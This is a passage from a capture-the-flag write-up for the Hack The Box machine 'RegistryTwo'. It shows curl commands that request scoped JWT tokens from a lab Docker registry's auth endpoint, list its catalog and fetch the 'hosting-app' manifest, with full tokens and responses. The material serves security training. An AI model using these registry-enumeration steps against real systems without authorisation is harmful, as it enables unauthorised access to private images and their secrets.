</code></pre></div><p>Even if we specify the JWT token in the <code>Authorization</code> header, we get the same error:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k https://10.10.11.223:5000/v2/_catalog -iH <span class="code-dark-yellow">'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiIiwiZXhwIjoxNjkwMzI1NjIzLCJuYmYiOjE2OTAzMjQ3MTMsImlhdCI6MTY5MDMyNDcyMywianRpIjoiMjg0MDQzMTczMjI1NjAxNDEzNyIsImFjY2VzcyI6W119.gLTb6ZMTD3P_dG437Na6vlQ7wh4OqOv76KsAY2uNUV0x0cfNn947M2k763lk5slLWYeuea73HCgv6AThTucSBnPJDzwIGBuF43wQLJ9_ycLsu0QCxEwkC6blh2k7d3n4PfVxhObchvaV1Qx_GtjIM_95tCH4pzQaZMMOPSfGGkNRv7LEsDK65mE6VDJL3IOLPkCqrUUMxeM-SZsSfe_A6sclCk8_QIrAHUQPntAQgzhA-u5vjx8ocrAewl6WVVXfu6rYc1bWegFlkR2DS-bjhhsHksX1Fmc_Ws5HuG2nq5vekiAgShKF4LP2dwOxoNozU1UQA1u4hYcdCadh0YWcpw'</span>  
HTTP/2 401
<span class="code-white">content-type</span>: application/json; charset=utf-8
<span class="code-white">docker-distribution-api-version</span>: registry/2.0
<span class="code-white">www-authenticate</span>: Bearer realm="https://webhosting.htb:5001/auth",service="Docker registry",scope="registry:catalog:*",error="invalid_token"
<span class="code-white">x-content-type-options</span>: nosniff
<span class="code-white">content-length</span>: 145
<span class="code-white">date</span>: Tue, 25 Jul 2023 22:42:20 GMT

{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":[{"Type":"registry","Class":"","Name":"catalog","Action":"*"}]}]}
</code></pre></div><p>The JWT token contains this information (taken from <a target="_blank" href="https://jwt.io">jwt.io</a>):</p><p><img alt="RegistryTwo 14" src="/images/HTB/RegistryTwo/RegistryTwo-14.webp"></p><p>Docker also provides authentication with JWT. Moreover, looking at the above JWT token, we can see that we don&rsquo;t have permissions to access anything. In the <a target="_blank" href="https://docs.docker.com/registry/spec/auth/jwt/">Docker documentation</a>, we find that:</p><blockquote><p>The Claim Set will also contain a private claim name unique to this authorization server specification:</p><p><code>access</code>: An array of access entry objects with the following fields:</p><ul><li><p><code>type</code>: The type of resource hosted by the service.</p></li><li><p><code>name</code>: The name of the resource of the given type hosted by the service.</p></li><li><p><code>actions</code>: An array of strings which give the actions authorized on this resource.</p></li></ul></blockquote><p>Looking again at the <a target="_blank" href="https://docs.docker.com/registry/spec/auth/jwt/">Docker documentation</a>, we find a way to obtain a JWT token with a given scope:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">https://auth.docker.io/token?service=registry.docker.io&scope=repository:samalba/my-app:pull,push  
</code></pre></div><p>Matching the above request with the error we get, we can successfully build this request to get a better JWT token:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k <span class="code-dark-yellow">'https://10.10.11.223:5001/auth?service=Docker+registry&scope=registry:catalog:*'</span>
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwMzI4NzI0LCJuYmYiOjE2OTAzMjc4MTQsImlhdCI6MTY5MDMyNzgyNCwianRpIjoiMjczNjY0ODcxMTIyNzI1MTQ0OCIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.qjEAM2X68R_lKM0G0RETWvpXIuDxPiVZeOpZgtRml7GPFGCkSSed_6YaPkypIjSYlWNi_kUHTRQWN9H5iaFL9NsD8mnzPuuxrnmlA30rtn8DEkdNZqUFsmJf-Do-1a6aC6jNSopPBKz-WpOHrCrBnQQav3AAv0L0CauK-r-rwFmYCTx30DmjkWA7JGFHWLXCUDL66lK74tzFiJM0xtd5XrLInPUZ6p9wD6ZLki967QHiS9lUQ7vFmPxkwTAJsNd_fCbUsh7FeEnkiMkXSYtQs9TglaluGrp9WB7J3koZ9qya3p7Bf93Br0XdbmJdoaFWJWgHz8mcwoAtHZNQg84BmA","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwMzI4NzI0LCJuYmYiOjE2OTAzMjc4MTQsImlhdCI6MTY5MDMyNzgyNCwianRpIjoiMjczNjY0ODcxMTIyNzI1MTQ0OCIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.qjEAM2X68R_lKM0G0RETWvpXIuDxPiVZeOpZgtRml7GPFGCkSSed_6YaPkypIjSYlWNi_kUHTRQWN9H5iaFL9NsD8mnzPuuxrnmlA30rtn8DEkdNZqUFsmJf-Do-1a6aC6jNSopPBKz-WpOHrCrBnQQav3AAv0L0CauK-r-rwFmYCTx30DmjkWA7JGFHWLXCUDL66lK74tzFiJM0xtd5XrLInPUZ6p9wD6ZLki967QHiS9lUQ7vFmPxkwTAJsNd_fCbUsh7FeEnkiMkXSYtQs9TglaluGrp9WB7J3koZ9qya3p7Bf93Br0XdbmJdoaFWJWgHz8mcwoAtHZNQg84BmA"}  

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k https://webhosting.htb:5000/v2/_catalog -H <span class="code-dark-yellow">'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwMzI4NzI0LCJuYmYiOjE2OTAzMjc4MTQsImlhdCI6MTY5MDMyNzgyNCwianRpIjoiMjczNjY0ODcxMTIyNzI1MTQ0OCIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.qjEAM2X68R_lKM0G0RETWvpXIuDxPiVZeOpZgtRml7GPFGCkSSed_6YaPkypIjSYlWNi_kUHTRQWN9H5iaFL9NsD8mnzPuuxrnmlA30rtn8DEkdNZqUFsmJf-Do-1a6aC6jNSopPBKz-WpOHrCrBnQQav3AAv0L0CauK-r-rwFmYCTx30DmjkWA7JGFHWLXCUDL66lK74tzFiJM0xtd5XrLInPUZ6p9wD6ZLki967QHiS9lUQ7vFmPxkwTAJsNd_fCbUsh7FeEnkiMkXSYtQs9TglaluGrp9WB7J3koZ9qya3p7Bf93Br0XdbmJdoaFWJWgHz8mcwoAtHZNQg84BmA'</span>
{"repositories":["hosting-app"]}
</code></pre></div><p>Now it works because we have some information in the <code>access</code> field within the Claim Set of the JWT token:</p><p><img alt="RegistryTwo 15" src="/images/HTB/RegistryTwo/RegistryTwo-15.webp"></p><p>There is only one repository: <code>hosting-app</code>. If we try to enumerate this, we will get another authorization error:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k https://10.10.11.223:5000/v2/hosting-app/manifests/v2 -iH <span class="code-dark-yellow">'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwMzI4NzI0LCJuYmYiOjE2OTAzMjc4MTQsImlhdCI6MTY5MDMyNzgyNCwianRpIjoiMjczNjY0ODcxMTIyNzI1MTQ0OCIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.qjEAM2X68R_lKM0G0RETWvpXIuDxPiVZeOpZgtRml7GPFGCkSSed_6YaPkypIjSYlWNi_kUHTRQWN9H5iaFL9NsD8mnzPuuxrnmlA30rtn8DEkdNZqUFsmJf-Do-1a6aC6jNSopPBKz-WpOHrCrBnQQav3AAv0L0CauK-r-rwFmYCTx30DmjkWA7JGFHWLXCUDL66lK74tzFiJM0xtd5XrLInPUZ6p9wD6ZLki967QHiS9lUQ7vFmPxkwTAJsNd_fCbUsh7FeEnkiMkXSYtQs9TglaluGrp9WB7J3koZ9qya3p7Bf93Br0XdbmJdoaFWJWgHz8mcwoAtHZNQg84BmA'</span>  
HTTP/2 401
<span class="code-white">content-type</span>: application/json; charset=utf-8
<span class="code-white">docker-distribution-api-version</span>: registry/2.0
<span class="code-white">www-authenticate</span>: Bearer realm="https://webhosting.htb:5001/auth",service="Docker registry",scope="repository:hosting-app:pull",error="insufficient_scope"
<span class="code-white">x-content-type-options</span>: nosniff
<span class="code-white">content-length</span>: 154
<span class="code-white">date</span>: Tue, 25 Jul 2023 23:34:08 GMT

{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":[{"Type":"repository","Class":"","Name":"hosting-app","Action":"pull"}]}]}
</code></pre></div><p>So, we need to add permissions to the JWT token on this scope:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k <span class="code-dark-yellow">'https://10.10.11.223:5001/auth?service=Docker+registry&scope=repository:hosting-app:pull'</span>
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwMzI5MDMwLCJuYmYiOjE2OTAzMjgxMjAsImlhdCI6MTY5MDMyODEzMCwianRpIjoiMjcxMjE4MTkzOTE1OTY2NDI1MiIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.gY4JoGWaELk_3AGkatkP-FhjN12UXpm-DfyUTN7jQ7PQcPkxDYi6HUeNBAPmWv4T9BkhITaFJJYgTktyfOc_n-_6lkr_aAN46DOABV2pAEHP7JdhfoVw5tlyt5tYZ6Gh8DZh9KOee8jz6p3ZCFbBE-0d0nAWYAhK-Pi1styVq6mwCUziSILnOWZ8l1s6hiUiGXvMaMACpvgzq70K350i_ozv0ZlqNGkhd6po0LTd0Ves7ICaf2-BaJ7HXMtrliz-JcOLiAPasxKPpojmOVP0vnYyFxKxw6kA-t-i6MMpP-lrCW8ASsxTK7Y_x2bn-A3ZBsM1oINQmpaP0FQero3kuA","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwMzI5MDMwLCJuYmYiOjE2OTAzMjgxMjAsImlhdCI6MTY5MDMyODEzMCwianRpIjoiMjcxMjE4MTkzOTE1OTY2NDI1MiIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.gY4JoGWaELk_3AGkatkP-FhjN12UXpm-DfyUTN7jQ7PQcPkxDYi6HUeNBAPmWv4T9BkhITaFJJYgTktyfOc_n-_6lkr_aAN46DOABV2pAEHP7JdhfoVw5tlyt5tYZ6Gh8DZh9KOee8jz6p3ZCFbBE-0d0nAWYAhK-Pi1styVq6mwCUziSILnOWZ8l1s6hiUiGXvMaMACpvgzq70K350i_ozv0ZlqNGkhd6po0LTd0Ves7ICaf2-BaJ7HXMtrliz-JcOLiAPasxKPpojmOVP0vnYyFxKxw6kA-t-i6MMpP-lrCW8ASsxTK7Y_x2bn-A3ZBsM1oINQmpaP0FQero3kuA"}  
</code></pre></div><p>This machine is called RegistryTwo, which comes after Registry, another machine from Hack The Box that was all about a Docker registry. <a target="_blank" href="https://notsosecure.com/anatomy-of-a-hack-docker-registry">Here</a> you can find some ways to enumerate Docker registries. From here, we can find the latest version of the <code>hosting-app</code> image and download all blobs (layers of a Docker image):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k https://10.10.11.223:5000/v2/hosting-app/manifests/latest -iH <span class="code-dark-yellow">'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwMzI5MDMwLCJuYmYiOjE2OTAzMjgxMjAsImlhdCI6MTY5MDMyODEzMCwianRpIjoiMjcxMjE4MTkzOTE1OTY2NDI1MiIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.gY4JoGWaELk_3AGkatkP-FhjN12UXpm-DfyUTN7jQ7PQcPkxDYi6HUeNBAPmWv4T9BkhITaFJJYgTktyfOc_n-_6lkr_aAN46DOABV2pAEHP7JdhfoVw5tlyt5tYZ6Gh8DZh9KOee8jz6p3ZCFbBE-0d0nAWYAhK-Pi1styVq6mwCUziSILnOWZ8l1s6hiUiGXvMaMACpvgzq70K350i_ozv0ZlqNGkhd6po0LTd0Ves7ICaf2-BaJ7HXMtrliz-JcOLiAPasxKPpojmOVP0vnYyFxKxw6kA-t-i6MMpP-lrCW8ASsxTK7Y_x2bn-A3ZBsM1oINQmpaP0FQero3kuA'</span>
HTTP/2 200
content-type: application/vnd.docker.distribution.manifest.v1+prettyjws
docker-content-digest: sha256:9c2f139166919ecdd1942eac8980803d0a6a0136cd0fd86e64c1c0977b4142b8
docker-distribution-api-version: registry/2.0
etag: "sha256:9c2f139166919ecdd1942eac8980803d0a6a0136cd0fd86e64c1c0977b4142b8"
x-content-type-options: nosniff
content-length: 26739
date: Tue, 25 Jul 2023 23:36:31 GMT

{
   "schemaVersion": 1,
   "name": "hosting-app",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba"
      },
      {
         "blobSum": "sha256:4a19a05f49c2d93e67d7c9ea8ba6c310d6b358e811c8ae37787f21b9ad82ac42"
      },
      {
         "blobSum": "sha256:9e700b74cc5b6f81ed6513fa03c7b6ab11a71deb8e27604632f723f81aca3268"
      },
      {
         "blobSum": "sha256:b5ac54f57d23fa33610cb14f7c21c71aa810e58884090cead5e3119774a202dc"
      },
      {
         "blobSum": "sha256:396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7"
      },
      {
         "blobSum": "sha256:9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c"
      },
      {
         "blobSum": "sha256:ab55eca3206e27506f679b41b39ba0e4c98996fa347326b6629dae9163b4c0ec"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:f7b708f947c32709ecceaffd85287d5eb9916a3013f49c8416228ef22c2bf85e"
      },
      {
         "blobSum": "sha256:497760bf469e19f1845b7f1da9cfe7e053beb57d4908fb2dff2a01a9f82211f9"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:e4cc5f625cda9caa32eddae6ac29b170c8dc1102988b845d7ab637938f2f6f84"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:0da484dfb0612bb168b7258b27e745d0febf56d22b8f10f459ed0d1dfe345110"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:7b43ca85cb2c7ccc62e03067862d35091ee30ce83e7fed9e135b1ef1c6e2e71b"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:fa7536dd895ade2421a9a0fcf6e16485323f9e2e45e917b1ff18b0f648974626"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:5de5f69f42d765af6ffb6753242b18dd4a33602ad7d76df52064833e5c527cb4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:ff3a5c916c92643ff77519ffa742d3ec61b7f591b6b7504599d95a4a41134e28"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"app\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\",\"LANG=C.UTF-8\",\"JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jre\",\"JAVA_VERSION=8u151\",\"JAVA_ALPINE_VERSION=8.151.12-r0\",\"CATALINA_HOME=/usr/local/tomcat\",\"TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib\",\"LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\",\"GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23\",\"TOMCAT_MAJOR=9\",\"TOMCAT_VERSION=9.0.2\",\"TOMCAT_SHA1=b59e1d658a4edbca7a81d12fd6f20203a4da9743\",\"TOMCAT_TGZ_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz\",\"TOMCAT_ASC_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc\"],\"Cmd\":[\"catalina.sh\",\"run\"],\"Image\":\"sha256:57f3a04ba3229928a30942945b0fb3c74bd61cec80cbc5a41d7d61a2d1c3ec4f\",\"Volumes\":null,\"WorkingDir\":\"/usr/local/tomcat\",\"Entrypoint\":null,\"OnBuild\":[],\"Labels\":null},\"container\":\"2f8f037b0e059fa89bc318719f991b783cd3c4b92de4a6776cc5ec3a8530d6ba\",\"container_config\":{\"Hostname\":\"2f8f037b0e05\",\"Domainname\":\"\",\"User\":\"app\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\",\"LANG=C.UTF-8\",\"JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jre\",\"JAVA_VERSION=8u151\",\"JAVA_ALPINE_VERSION=8.151.12-r0\",\"CATALINA_HOME=/usr/local/tomcat\",\"TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib\",\"LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\",\"GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23\",\"TOMCAT_MAJOR=9\",\"TOMCAT_VERSION=9.0.2\",\"TOMCAT_SHA1=b59e1d658a4edbca7a81d12fd6f20203a4da9743\",\"TOMCAT_TGZ_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz\",\"TOMCAT_ASC_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) \",\"CMD [\\\"catalina.sh\\\" \\\"run\\\"]\"],\"Image\":\"sha256:57f3a04ba3229928a30942945b0fb3c74bd61cec80cbc5a41d7d61a2d1c3ec4f\",\"Volumes\":null,\"WorkingDir\":\"/usr/local/tomcat\",\"Entrypoint\":null,\"OnBuild\":[],\"Labels\":{}},\"created\":\"2023-07-04T10:57:03.768956926Z\",\"docker_version\":\"20.10.23\",\"id\":\"1f5797acb3ce332a92212fac43141b9179f396db844876ea976828c027cc5cd2\",\"os\":\"linux\",\"parent\":\"b581fd7323f8b829979a384105c27aeff6f114f0b5e63aaa00e4090ce50df370\",\"throwaway\":true}"  
      },
      {
         "v1Compatibility": "{\"id\":\"b581fd7323f8b829979a384105c27aeff6f114f0b5e63aaa00e4090ce50df370\",\"parent\":\"1c287aa55678a4fa6681ba16d09ce6bf798fac6640dceb43230e18a04316aee1\",\"created\":\"2023-07-04T10:57:03.500684978Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  USER app\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"1c287aa55678a4fa6681ba16d09ce6bf798fac6640dceb43230e18a04316aee1\",\"parent\":\"c5b60d48ea6e9578b52142829c5a979f0429207c7ff107f556c73b2d00230ba2\",\"created\":\"2023-07-04T10:57:03.230181852Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY --chown=app:appfile:24e216b758a41629b4357c4cd3aa1676635e7f68b432edff5124a8af4b95362f in /etc/hosting.ini \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"c5b60d48ea6e9578b52142829c5a979f0429207c7ff107f556c73b2d00230ba2\",\"parent\":\"8352728bd14b4f5a18051ae76ce15e3d3a97180d5a699b3847d89570e37354f1\",\"created\":\"2023-07-04T10:57:02.865658784Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c chown -R app /usr/local/tomcat/\"]}}"
      },
      {
